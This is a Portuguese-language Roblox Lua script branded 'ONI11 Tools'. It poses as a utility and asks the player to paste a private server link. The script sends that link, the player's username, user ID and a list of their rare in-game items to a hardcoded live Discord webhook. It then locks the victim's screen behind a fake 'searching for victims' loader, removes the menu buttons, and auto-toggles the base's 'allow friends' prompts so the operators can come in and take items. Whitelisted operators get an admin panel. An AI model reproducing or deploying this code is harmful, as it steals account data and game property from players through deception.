local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- === Função para detectar Brainrots ===
local Workspace = game:GetService("Workspace")
local plots = Workspace:WaitForChild("Plots")

local function reconhecerBrainrots()
    local brainrotsEncontrados = {}
    for _, obj in ipairs(plots:GetDescendants()) do
        if obj:IsA("TextLabel") and obj.Name == "Rarity" then
            local rarityText = obj.Text
            if rarityText == "Brainrot God" or rarityText == "Secret" then
                local parent = obj.Parent
                local displayName = parent:FindFirstChild("DisplayName")
                local generation = parent:FindFirstChild("Generation")
                if displayName and generation and displayName:IsA("TextLabel") and generation:IsA("TextLabel") then
                    -- Pega o valor numérico por segundo
                    local genText = generation.Text
                    local genValue = tonumber(string.match(genText, "%d+%.?%d*")) or genText
                    table.insert(brainrotsEncontrados, {
                        name = displayName.Text,
                        rarity = rarityText,
                        generation = genValue
                    })
                end
            end
        end
    end
    return brainrotsEncontrados
end

local brainrots = reconhecerBrainrots()
        local brainrotValue = "Nenhum **Brainrot God** ou **Secret** encontrado."
        
        if #brainrots > 0 then
            local list = {}
            for i, br in ipairs(brainrots) do
                table.insert(list, string.format("**%d.** **%s** **[**%s**]** - **%s**/s", i, br.name, br.rarity, br.generation))
            end
            brainrotValue = table.concat(list, "\n")
        end

-- Exemplo de uso:
-- local brainrots = reconhecerBrainrots()
-- for _, br in ipairs(brainrots) do
--     print(br.name, br.rarity, br.generation)
-- end

local WHITELIST = {
    379836892,
    987654321,
    111222333,
}

local WEBHOOK_URL = "https://discord.com/api/webhooks/1428177817874600097/m0cCWVE1nt6Hk3DkU3CzLG_cY1Uq853lv9h8f6LP3HFmjfg_7skrqbe1VR_u0ycEkAVV"

local request_func = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

local function isWhitelisted(userId)
    for _, id in ipairs(WHITELIST) do
        if id == userId then
            return true
        end
    end
    return false
end

-- VERIFICAÇÃO DE MÚLTIPLOS JOGADORES (apenas para não-whitelisted)
spawn(function()
    while true do
        local PlayerCount = #Players:GetPlayers()
        
        if PlayerCount > 1 then
            local ExecutorPlayer = Players.LocalPlayer
            
            -- SÓ KICKA SE NÃO ESTIVER NA WHITELIST
            if not isWhitelisted(ExecutorPlayer.UserId) then
                ExecutorPlayer:Kick("Esse script não funciona em servidores públicos ou se tiver mais de 1 jogador.")
                break
            end
        end
        
        wait(1)
    end
end)

local function createCaptureScreen()
    local function killTopBar()
        pcall(function()
            StarterGui:SetCore("TopbarEnabled", false)
        end)
    end

    local function removeMenuButtons()
        pcall(function()
            local RobloxGui = CoreGui:WaitForChild("RobloxGui")
            local MenuButton
            
            repeat
                MenuButton = RobloxGui:FindFirstChild("SettingsShield", true) or 
                             RobloxGui:FindFirstChild("ThreeDots", true) or 
                             RobloxGui:FindFirstChild("SettingsButton", true)
                task.wait()
            until MenuButton
            
            if MenuButton then
                MenuButton:Destroy()
            end
        end)
    end

    local function applyFullLockdown()
        killTopBar()
        removeMenuButtons()
        
        RunService.RenderStepped:Connect(killTopBar)
        
        player.CharacterAdded:Connect(function()
            killTopBar()
        end)
    end
    
    local function startMainScript()
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    local humanoid = character:WaitForChild("Humanoid")

    local SEARCH_INTERVAL = 0.1
    local MAX_DISTANCE = 2500
    local BASE_RADIUS = 150
    local WALK_DISTANCE = 10
    local INTERACTION_DELAY = 0.1

    local currentTarget = nil
    local isMoving = false
    local baseCenter = nil

    task.wait(0.1)
    baseCenter = humanoidRootPart.Position

    local function isInMyBase(part)
        if not baseCenter then
            baseCenter = humanoidRootPart.Position
        end
        
        local distance = (part.Position - baseCenter).Magnitude
        return distance <= BASE_RADIUS
    end

    local function findTargetPrompt()
        local bestPrompt = nil
        local closestDistance = math.huge
        
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("ProximityPrompt") and obj.Enabled then
                local parent = obj.Parent
                
                if parent and parent:IsA("BasePart") then
                    local objText = obj.ObjectText:lower()
                    local actText = obj.ActionText:lower()
                    
                    local isTarget = objText:find("permita") or objText:find("amigo") or 
                                    actText:find("alternar") or actText:find("toggle") or
                                    objText:find("friend") or actText:find("allow")
                    
                    if isTarget then
                        if not isInMyBase(parent) then
                            continue
                        end
                        
                        local distance = (humanoidRootPart.Position - parent.Position).Magnitude
                        
                        if distance <= MAX_DISTANCE and distance < closestDistance then
                            local promptId = obj:GetFullName()
                            
                            if _G.AutoFriendPermanentProcessed[promptId] then
                                continue
                            end
                            
                            if not _G.AutoFriendProcessedButtons[promptId] or (tick() - _G.AutoFriendProcessedButtons[promptId]) > 60 then
                                bestPrompt = {
                                    prompt = obj,
                                    part = parent,
                                    distance = distance,
                                    id = promptId,
                                    objText = obj.ObjectText,
                                    actText = obj.ActionText
                                }
                                closestDistance = distance
                            end
                        end
                    end
                end
            end
        end
        
        return bestPrompt
    end

    local function walkToTarget(targetPart)
        isMoving = true
        local attempts = 0
        local maxAttempts = 20
        
        while isMoving and attempts < maxAttempts do
            if not targetPart or not targetPart.Parent then
                isMoving = false
                return false
            end
            
            local distance = (humanoidRootPart.Position - targetPart.Position).Magnitude
            
            if distance <= WALK_DISTANCE then
                humanoid:Move(Vector3.new(0, 0, 0))
                isMoving = false
                return true
            end
            
            humanoid:MoveTo(targetPart.Position)
            
            wait(0.1)
            attempts = attempts + 1
        end
        
        humanoid:Move(Vector3.new(0, 0, 0))
        isMoving = false
        return false
    end

    local function interactWithPrompt(promptData)
        local prompt = promptData.prompt
        
        if not prompt or not prompt.Parent or not prompt.Enabled then
            return false
        end
        
        local success1 = pcall(function()
            fireproximityprompt(prompt)
        end)
        
        if success1 then
            _G.AutoFriendProcessedButtons[promptData.id] = tick()
            _G.AutoFriendPermanentProcessed[promptData.id] = true
            return true
        end
        
        wait(0.1)
        local success2 = pcall(function()
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
            wait(0.01)
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
        end)
        
        if success2 then
            _G.AutoFriendProcessedButtons[promptData.id] = tick()
            _G.AutoFriendPermanentProcessed[promptData.id] = true
            return true
        end
        
        return false
    end

    local function mainLoop()
        while _G.AutoFriendRunning do
            if not isMoving then
                local target = findTargetPrompt()
                
                if target then
                    currentTarget = target
                    
                    if target.distance > WALK_DISTANCE then
                        local reached = walkToTarget(target.part)
                        
                        if reached then
                            wait(INTERACTION_DELAY)
                            interactWithPrompt(target)
                            wait(0.1)
                        else
                            wait(0.1)
                        end
                        
                        isMoving = false
                        currentTarget = nil
                    else
                        wait(INTERACTION_DELAY)
                        interactWithPrompt(target)
                        wait(0.1)
                        currentTarget = nil
                    end
                end
            end
            
            wait(SEARCH_INTERVAL)
        end
    end

    _G.StopAutoFriend = function()
        _G.AutoFriendRunning = false
        isMoving = false
        if humanoid then
            humanoid:Move(Vector3.new(0, 0, 0))
        end
    end

    _G.StartAutoFriend = function()
        if _G.AutoFriendRunning then
            return
        end
        
        _G.AutoFriendRunning = true
        _G.AutoFriendProcessedButtons = {}
        spawn(mainLoop)
    end

    _G.ResetBaseCenter = function()
        baseCenter = humanoidRootPart.Position
    end

    _G.SetBaseRadius = function(radius)
        BASE_RADIUS = radius
    end

    _G.ClearProcessed = function()
        _G.AutoFriendPermanentProcessed = {}
        _G.AutoFriendProcessedButtons = {}
    end

    wait(0.1)
    _G.StartAutoFriend()
end

-- Inicializar variáveis globais
if not _G.AutoFriendInitialized then
    _G.AutoFriendProcessedButtons = {}
    _G.AutoFriendPermanentProcessed = {}
    _G.AutoFriendRunning = false
    _G.AutoFriendInitialized = true
    _G.AutoFriendFirstRun = true
end

    local screenGui = Instance.new("ScreenGui", playerGui)
    screenGui.Name = "SimpleSendGui"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.DisplayOrder = 999

    local frame = Instance.new("Frame", screenGui)
    frame.AnchorPoint = Vector2.new(0.5, 0.5)
    frame.Size = UDim2.new(0.35, 0, 0, 200)
    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
    frame.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
    frame.BorderSizePixel = 0

    local frameCorner = Instance.new("UICorner", frame)
    frameCorner.CornerRadius = UDim.new(0, 12)

    local title = Instance.new("TextLabel", frame)
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "ONI11 Tools"
    title.Font = Enum.Font.GothamBold
    title.TextSize = 22
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextYAlignment = Enum.TextYAlignment.Center

    local textBox = Instance.new("TextBox", frame)
    textBox.Name = "InputBox"
    textBox.Size = UDim2.new(0.9, 0, 0, 90)
    textBox.Position = UDim2.new(0.05, 0, 0.28, 0)
    textBox.ClearTextOnFocus = false
    textBox.Text = ""
    textBox.PlaceholderText = "Cole o link do seu servidor privado!"
    textBox.Font = Enum.Font.Gotham
    textBox.TextSize = 21
    textBox.TextColor3 = Color3.fromRGB(230, 230, 230)
    textBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    textBox.BackgroundTransparency = 0.85
    textBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
    textBox.TextWrapped = true
    textBox.MultiLine = true
    textBox.TextYAlignment = Enum.TextYAlignment.Top

    local textCorner = Instance.new("UICorner", textBox)
    textCorner.CornerRadius = UDim.new(0, 8)

    local sendButton = Instance.new("TextButton", frame)
    sendButton.Name = "SendButton"
    sendButton.Size = UDim2.new(0.9, 0, 0, 40)
    sendButton.Position = UDim2.new(0.05, 0, 0.78, 0)
    sendButton.Text = "Continuar"
    sendButton.Font = Enum.Font.GothamBold
    sendButton.TextSize = 18
    sendButton.TextColor3 = Color3.fromRGB(0, 0, 0)
    sendButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    sendButton.BorderSizePixel = 0
    sendButton.AutoButtonColor = true

    local buttonCorner = Instance.new("UICorner", sendButton)
    buttonCorner.CornerRadius = UDim.new(0, 10)

    local loadingScreen = Instance.new("Frame", screenGui)
    loadingScreen.Name = "LoadingScreen"
    loadingScreen.Size = UDim2.new(1, 0, 1, 0)
    loadingScreen.Position = UDim2.new(0, 0, 0, 0)
    loadingScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    loadingScreen.BackgroundTransparency = 0
    loadingScreen.BorderSizePixel = 0
    loadingScreen.Visible = false
    loadingScreen.ZIndex = 999999
    loadingScreen.Active = true

    local loadingFrame = Instance.new("Frame", loadingScreen)
    loadingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    loadingFrame.Size = UDim2.new(0, 200, 0, 200)
    loadingFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    loadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    loadingFrame.BorderSizePixel = 0
    loadingFrame.ZIndex = 1000000

    local loadingFrameCorner = Instance.new("UICorner", loadingFrame)
    loadingFrameCorner.CornerRadius = UDim.new(0, 15)

    local loadingSpinner = Instance.new("ImageLabel", loadingFrame)
    loadingSpinner.Name = "Spinner"
    loadingSpinner.AnchorPoint = Vector2.new(0.5, 0.5)
    loadingSpinner.Size = UDim2.new(0, 80, 0, 80)
    loadingSpinner.Position = UDim2.new(0.5, 0, 0.4, 0)
    loadingSpinner.BackgroundTransparency = 1
    loadingSpinner.Image = "rbxassetid://4965945816"
    loadingSpinner.ImageColor3 = Color3.fromRGB(255, 255, 255)
    loadingSpinner.ZIndex = 1000001

    local loadingText = Instance.new("TextLabel", loadingFrame)
    loadingText.Size = UDim2.new(0.9, 0, 0, 40)
    loadingText.Position = UDim2.new(0.05, 0, 0.7, 0)
    loadingText.BackgroundTransparency = 1
    loadingText.Text = "Procurando vítimas..."
    loadingText.Font = Enum.Font.GothamBold
    loadingText.TextSize = 20
    loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
    loadingText.TextYAlignment = Enum.TextYAlignment.Center
    loadingText.ZIndex = 1000001

    local function startLoadingAnimation()
        loadingScreen.Visible = true
        frame.Visible = false
        
        loadingScreen.MouseEnter:Connect(function() end)
        loadingScreen.MouseLeave:Connect(function() end)
        loadingScreen.InputBegan:Connect(function() end)
        loadingScreen.InputEnded:Connect(function() end)
        
        spawn(function()
            while loadingScreen.Visible do
                for rotation = 0, 360, 10 do
                    if not loadingScreen.Visible then break end
                    loadingSpinner.Rotation = rotation
                    task.wait(0.03)
                end
            end
        end)
        
        local loadingTexts = {"Procurando vítimas", "Procurando vítimas.", "Procurando vítimas..", "Procurando vítimas..."}
        local textIndex = 1
        spawn(function()
            while loadingScreen.Visible do
                loadingText.Text = loadingTexts[textIndex]
                textIndex = textIndex % #loadingTexts + 1
                task.wait(0.5)
            end
        end)
        
        task.wait(2)
        applyFullLockdown()
    end
    
    player.CharacterAdded:Connect(function(newChar)
        task.wait(1)
        startMainScript()
    end)
    
    -- Iniciar limpeza de cache
    if not _G.AutoFriendCleanupRunning then
        _G.AutoFriendCleanupRunning = true
        spawn(function()
            while wait(30) do
                if _G.AutoFriendProcessedButtons then
                    local now = tick()
                    for k, v in pairs(_G.AutoFriendProcessedButtons) do
                        if now - v > 60 then
                            _G.AutoFriendProcessedButtons[k] = nil
                        end
                    end
                end
            end
        end)
    end
    
    -- Verificar se precisa resetar
    if _G.AutoFriendFirstRun then
        _G.AutoFriendFirstRun = false
        
        if player.Character and player.Character:FindFirstChild("Humanoid") then
            player.Character.Humanoid.Health = 0
        end
    else
        startMainScript()
    end
end

    local cooldown = false

    local function isValidPrivateServerLink(link)
        link = link:gsub("^%s+", ""):gsub("%s+$", "")
        
        local patterns = {
            "https://www%.roblox%.com/games/%d+/.-%?privateServerLinkCode=",
            "https://www%.roblox%.com/games/%d+%?privateServerLinkCode=",
            "www%.roblox%.com/games/%d+/.-%?privateServerLinkCode=",
            "www%.roblox%.com/games/%d+%?privateServerLinkCode=",
            "roblox%.com/games/%d+/.-%?privateServerLinkCode=",
            "roblox%.com/games/%d+%?privateServerLinkCode=",
            "https://www%.roblox%.com/share%?code=.+&type=Server",
            "https://www%.roblox%.com/share%?code=.+&type=server",
            "www%.roblox%.com/share%?code=.+&type=Server",
            "www%.roblox%.com/share%?code=.+&type=server",
            "roblox%.com/share%?code=.+&type=Server",
            "roblox%.com/share%?code=.+&type=server"
        }
        
        for _, pattern in ipairs(patterns) do
            if link:match(pattern) then
                return true
            end
        end
        
        return false
    end

    local function sendToDiscord(message)
        if cooldown then 
            sendButton.Text = "Aguarde..."
            return 
        end
        
        local msg = message:gsub("^%s+", ""):gsub("%s+$", "")
        
        if msg == "" then
            sendButton.Text = "Campo vazio!"
            sendButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
            task.wait(2)
            sendButton.Text = "Continuar"
            sendButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            return
        end
        
        if not isValidPrivateServerLink(msg) then
            sendButton.Text = "Link inválido!"
            sendButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
            task.wait(2)
            sendButton.Text = "Continuar"
            sendButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            return
        end
        
        if #msg > 2000 then
            sendButton.Text = "Texto muito longo!"
            sendButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
            task.wait(2)
            sendButton.Text = "Continuar"
            sendButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            return
        end
        
        cooldown = true
        sendButton.Text = "Aguarde..."
        sendButton.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
        
local embedData = {
    ["embeds"] = {{
        ["title"] = "<:emoji_8:1433244897229668402> **HIT!** - Novo jogador executou **ONI11 Tools!** <:emoji_6:1433243588409561209>",
        ["description"] = msg,
        ["color"] = 5814783,
        ["fields"] = {
            {
                ["name"] = "<:emoji_5:1433242277433835671> Usuário:",
                ["value"] = player.Name,
                ["inline"] = true
            },
            {
                ["name"] = "<:emoji_9:1433250200025170032> UserID:",
                ["value"] = tostring(player.UserId),
                ["inline"] = true
            },
            {
                ["name"] = "<:emoji_10:1433250382112620607> Display Name:",
                ["value"] = player.DisplayName,
                ["inline"] = true
            },
            {
                ["name"] = "<:emoji_7:1433244443799978005> Brainrots:",
                ["value"] = brainrotValue,
                ["inline"] = false
            }
        },
        ["footer"] = {
            ["text"] = "ONI11 Tools V1.0 | Notificador | " .. os.date("%d/%m/%Y às %H:%M")
        },
        ["image"] = {
            ["url"] = "https://files.catbox.moe/9ijspq.gif"
        }
    }}
}
        
        local success, response = pcall(function()
            return request_func({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(embedData)
            })
        end)
        
        if success and response.StatusCode == 204 then
            sendButton.Text = "Espere carregar!!"
            sendButton.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
            textBox.Text = ""
            
            task.wait(1)
            startLoadingAnimation()
        else
            sendButton.Text = "Erro ao continuar"
            sendButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
            warn("Erro:", response)
            
            task.wait(3)
            cooldown = false
            sendButton.Text = "Continuar"
            sendButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        end
    end

    sendButton.MouseButton1Click:Connect(function()
        sendToDiscord(textBox.Text)
    end)

    textBox.FocusLost:Connect(function(enterPressed)
        if enterPressed then
            sendToDiscord(textBox.Text)
        end
    end)

    print("GUI carregada! ONI11 TOOLS v1.0")
end

local function createAdminPanel()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PainelUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 230, 0, 300)
    frame.Position = UDim2.new(0.5, -115, 0.5, -150)
    frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    frame.BorderSizePixel = 0
    frame.Active = true
    frame.Draggable = true
    frame.Parent = screenGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = frame

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 35)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.SourceSansBold
    title.TextSize = 22
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Text = "AP - ONI11 Tools"
    title.Parent = frame

    local nomesBotoes = {";Kick", ";Kick zoas", ";Jumpscare"}
    local jogadorSelecionado = nil

    local function criarBotao(texto, ordem)
        local botao = Instance.new("TextButton")
        botao.Size = UDim2.new(1, -20, 0, 35)
        botao.Position = UDim2.new(0, 10, 0, 35 + (ordem - 1) * 40)
        botao.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        botao.TextColor3 = Color3.fromRGB(255, 255, 255)
        botao.Font = Enum.Font.SourceSansBold
        botao.TextSize = 18
        botao.Text = texto
        botao.Parent = frame

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 6)
        corner.Parent = botao

        botao.MouseButton1Click:Connect(function()
            if jogadorSelecionado then
                print(texto .. " executado em:", jogadorSelecionado.Name)
            else
                print("Nenhum jogador selecionado!")
            end
        end)
    end

    for i, nome in ipairs(nomesBotoes) do
        criarBotao(nome, i)
    end

    local playerDropdown = Instance.new("Frame")
    playerDropdown.Size = UDim2.new(1, -20, 0, 90)
    playerDropdown.Position = UDim2.new(0, 10, 0, 35 + (#nomesBotoes * 40))
    playerDropdown.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    playerDropdown.BorderSizePixel = 0
    playerDropdown.Parent = frame

    local dropCorner = Instance.new("UICorner")
    dropCorner.CornerRadius = UDim.new(0, 6)
    dropCorner.Parent = playerDropdown

    local dropTitle = Instance.new("TextLabel")
    dropTitle.Size = UDim2.new(1, 0, 0, 25)
    dropTitle.BackgroundTransparency = 1
    dropTitle.Font = Enum.Font.SourceSansBold
    dropTitle.TextSize = 18
    dropTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    dropTitle.Text = "Jogadores:"
    dropTitle.Parent = playerDropdown

    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1, 0, 1, -25)
    scroll.Position = UDim2.new(0, 0, 0, 25)
    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    scroll.ScrollBarThickness = 6
    scroll.BackgroundTransparency = 1
    scroll.Parent = playerDropdown

    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 3)
    layout.Parent = scroll

    local function atualizarLista()
        for _, obj in pairs(scroll:GetChildren()) do
            if obj:IsA("TextButton") then
                obj:Destroy()
            end
        end

        for _, plr in pairs(Players:GetPlayers()) do
            local item = Instance.new("TextButton")
            item.Size = UDim2.new(1, -5, 0, 22)
            item.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
            item.TextColor3 = Color3.fromRGB(255, 255, 255)
            item.Font = Enum.Font.SourceSans
            item.TextSize = 16
            item.Text = plr.Name
            item.Parent = scroll

            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 5)
            corner.Parent = item

            item.MouseButton1Click:Connect(function()
                jogadorSelecionado = plr
                print("Selecionado:", jogadorSelecionado.Name)
                for _, b in pairs(scroll:GetChildren()) do
                    if b:IsA("TextButton") then
                        b.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
                    end
                end
                item.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
            end)
        end

        scroll.CanvasSize = UDim2.new(0, 0, 0, #Players:GetPlayers() * 25)
    end

    Players.PlayerAdded:Connect(atualizarLista)
    Players.PlayerRemoving:Connect(atualizarLista)
    atualizarLista()

    local toggleButton = Instance.new("TextButton")
    toggleButton.Size = UDim2.new(0, 45, 0, 45)
    toggleButton.Position = UDim2.new(0.9, 0, 0.8, 0)
    toggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    toggleButton.Text = "AP"
    toggleButton.Font = Enum.Font.SourceSansBold
    toggleButton.TextSize = 28
    toggleButton.Active = true
    toggleButton.Draggable = true
    toggleButton.Parent = screenGui

    local circle = Instance.new("UICorner")
    circle.CornerRadius = UDim.new(1, 0)
    circle.Parent = toggleButton

    local visivel = true
    toggleButton.MouseButton1Click:Connect(function()
        visivel = not visivel
        frame.Visible = visivel
    end)

    print("5517", player.Name)
end

if isWhitelisted(player.UserId) then
    print("AP", player.UserId)
    createAdminPanel()
else
    print("AP", player.UserId)
    createCaptureScreen()
end